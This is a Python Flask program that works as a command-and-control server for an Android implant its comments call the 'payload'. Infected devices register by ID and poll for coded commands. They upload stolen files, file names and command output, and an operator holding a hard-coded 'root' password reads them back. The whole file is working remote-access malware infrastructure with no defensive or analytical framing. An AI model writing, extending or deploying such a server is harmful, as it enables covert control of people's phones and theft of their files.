from flask import Flask, request
import ast
import json
import os
import base64
old = ""
password = "root"

def cheak_requirments() :
    files = os.listdir(os.path.split(__file__)[0])
    if not "online_devices" in files :
       with open("online_devices", "w") as file :
            file.write("{}")
    if not "commands" in files :
       os.mkdir("commands")
    if not "response" in files :
       os.mkdir("response")


cheak_requirments()



def write_file(path, data) :
    with open(path, "w") as file :
         file.write(data)



with open("online_devices", "r") as file :
     data = file.read()
     online_devices = json.loads(data)

app = Flask(__name__)

@app.route("/", methods=["GET"])
def home() :
    return "hi"


@app.route("/upload/<android_id>", methods=["POST"])
def upload(android_id):
        # Receive Base64 data sent by the Android app
        encoded_data = request.get_data(as_text=True).strip()

        # Decode Base64
        file_bytes = base64.b64decode(encoded_data)

        with open(f"response/f:{android_id}", "wb") as f:
            f.write(file_bytes)



        return "Hello"


#update online from payload
@app.route("/001", methods=["POST"])
def update_online() :
    global old
    data = request.form["data"]
    android_id = data
    online_devices[android_id] = "online"
    if not str(old) == str(online_devices) :
       print(online_devices)
       old = str(online_devices)
       write_file("online_devices", json.dumps(online_devices))
       write_file(f"commands/{android_id}", "")
    return "Hello"

#get command fro payload
@app.route("/c_003/<android_id>")
def get_command_for_payload(android_id) :
    with open(f"commands/{android_id}", "r") as file :
         data = file.read()
    return data

#clear the commands executed by the payload
@app.route("/cmd/<id>")
def clear_commands(id) :
    with open(f"commands/{id}", "w") as file :
         file.write("")
    return "Hello"


#update the response from payload
@app.route("/response/file/<id>", methods=["POST"])
def store_file_from_payload(id) :
    data = request.data
    #print(data)
    data = data.decode()
    with open(f"response/f:{id}", "w") as file :
         file.write(data)
    return "Hello"


@app.route("/response/file_name/<id>", methods=["POST"])
def store_file_name_from_payload(id) :
    data = request.data
    print(data)
    data = data.decode()
    with open(f"response/fn:{id}", "w") as file :
         file.write(data)
    return "Hello"

@app.route("/response/<id>", methods=["POST"])
def store_response_from_payload(id) :
    data = request.data
    print(data)
    data = data.decode()
    with open(f"response/r:{id}", "w") as file :
         file.write(data)
    return "Hello"
#end


#-------------
# remote
#-------------




@app.route("/reset_all", methods=["POST"])
def reset_all() :
    data = request.data
    print(online_devices)
    if password == data.decode() :
       for android_id in online_devices :
           online_devices[android_id] = "offline"
    with open("online_devices", "w") as file :
         file.write(json.dumps(online_devices))
    return "Hi"

@app.route("/devices_status", methods=["POST"])
def status() :
    return str(online_devices)

@app.route("/command/<android_id>/<cmd>", methods=["POST"])
def commands(android_id, cmd) :
    data = request.data
    if password == data.decode() :
       if cmd == "1720" :
          with open(f"commands/{android_id}", "w") as file :
               file.write(f"{android_id}:7282")
       if cmd == "9263" :
          with open(f"commands/{android_id}", "w") as file :
               file.write(f"{android_id}:9381")
       if cmd == "8473" :
          with open(f"commands/{android_id}", "w") as file :
               file.write(f"{android_id}:3372")
       if cmd == "3871" :
          with open(f"commands/{android_id}", "w") as file :
               file.write(f"{android_id}:6022")
       if cmd == "2592" :
          with open(f"commands/{android_id}", "w") as file :
               file.write(f"{android_id}:6021")
       if cmd == "3416" :
          with open(f"commands/{android_id}","w") as file :
               file.write(f"{android_id}:2031")
       if cmd == "2432" :
          with open(f"commands/{android_id}","w") as file :
               file.write(f"{android_id}:2423")
       if cmd == "2713" :
          with open(f"commands/{android_id}","w") as file :
               file.write(f"{android_id}:2424")
    return "Hello"

@app.route("/clear_response/<android_id>", methods=["POST"])
def clear_response(android_id) :
    data = request.data
    if password == data.decode() :
     with open(f"response/r:{android_id}", "w") as file :
          file.write("")
     with open(f"response/f:{android_id}", "w") as file :
          file.write("")
     with open(f"response/fn:{android_id}", "w") as file :
          file.write("")
    return "Hello"

@app.route("/get_r/<android_id>", methods=["POST"])
def get(android_id) :
    data = request.data
    if password == data.decode() :
       with open(f"response/r:{android_id}", "r") as file :
            data = file.read()
    return data


@app.route("/get_f/<android_id>", methods=["POST"])
def get_f(android_id) :
    data = request.data
    if password == data.decode() :
       with open(f"response/f:{android_id}", "rb") as file :
            data = file.read()
    return data

@app.route("/get_fn/<android_id>", methods=["POST"])
def get_fb(android_id) :
    data = request.data
    if password == data.decode() :
       with open(f"response/fn:{android_id}", "r") as file :
            data = file.read()
    return data


app.run(host="127.0.0.1", port=2374)

